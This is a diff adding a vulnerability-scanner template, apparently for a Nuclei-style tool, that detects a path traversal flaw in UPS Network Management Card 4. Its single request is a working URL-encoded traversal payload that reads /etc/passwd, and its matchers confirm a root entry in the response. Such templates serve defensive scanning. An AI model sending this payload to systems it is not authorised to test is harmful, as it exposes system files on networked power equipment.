@@ -1,0 +1,25 @@
+id: ups-network-lfi
+name: UPS Network Management Card 4 Path Traversal
+severity: high
+confidence: confirmed
+description: UPS Network Management Card version 4 suffers from a path traversal vulnerability.
+reference: https://packetstormsecurity.com/files/177626/upsnmc4-traversal.txt
+tags:
+- packetstorm
+- ups
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: header
+    words:
+    - application/octet-stream
+  - type: status
+    status:
+    - 200
+  condition: and
